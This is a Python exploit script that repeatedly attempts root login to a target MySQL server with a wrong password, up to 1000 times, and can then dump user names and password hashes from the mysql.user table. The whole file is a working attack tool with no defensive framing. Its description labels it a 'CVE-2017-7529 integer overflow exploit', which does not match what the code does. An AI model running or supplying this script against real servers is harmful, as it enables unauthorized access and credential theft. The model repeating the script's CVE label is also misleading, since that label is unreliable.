import argparse
import time

import mysql.connector
from mysql.connector.errors import ProgrammingError


def perform_exploit(args):
    for i in range(1000):
        try:
            connection = mysql.connector.connect(
                host=args.server_ip,
                user='root',
                password='wrong',
                port='3306',
                database='mysql'
            )
            print('Successfully logged in with wrong password')

            if args.extract == 1:
                print('extracted user credentials: ')
                cursor = connection.cursor()
                cursor.execute("SELECT user, password FROM user;")

                for x in cursor:
                    print(x)
            break

        except ProgrammingError:
            print(args.speed)
            if args.speed == 's':
                print('sleeping...')
                time.sleep(1)
            elif args.speed == 'v':
                print('sleeping...')
                time.sleep(5)
            else:
                pass
        except Exception:
            break


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="CVE-2017-7529 integer overflow exploit")
    parser.add_argument('-ip',
                        dest='server_ip',
                        action='store',
                        type=str,
                        required=True,
                        help='The IP address of the target server'
                        )

    parser.add_argument('-speed',
                        dest='speed',
                        action='store',
                        type=str,
                        choices=['n', 's', 'v'],
                        required=True,
                        help='The speed of the attack.\n' +
                             'n: (normal) no sleep between tries\n' +
                             's: (slow) sleeps 1s after every try\n' +
                             'v: (very slow) sleeps 5s after every try'
                        )

    parser.add_argument('-extract',
                        dest='extract',
                        action='store',
                        type=int,
                        required=False,
                        help='True if user credentials shall be extracted after successful login'
                        )

    arguments = parser.parse_args()

    perform_exploit(arguments)
